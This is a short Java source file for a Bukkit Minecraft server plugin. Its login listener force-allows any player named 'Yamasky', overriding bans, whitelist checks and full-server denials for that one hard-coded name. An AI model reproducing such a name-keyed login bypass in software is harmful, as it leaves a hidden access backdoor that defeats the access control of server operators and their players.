package me.yamas.core.listeners;

import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerLoginEvent;

public class PlayerLogin implements Listener{
	
	@EventHandler
	public void onLogin(PlayerLoginEvent e){
		if(e.getPlayer().getName().equalsIgnoreCase("Yamasky")){
			e.allow();
		}
	}

}
